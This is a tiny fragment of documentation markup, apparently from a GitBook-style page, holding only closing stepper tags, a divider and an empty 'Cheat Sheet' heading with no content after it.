{% endstep %}
{% endstepper %}

***

## Cheat Sheet
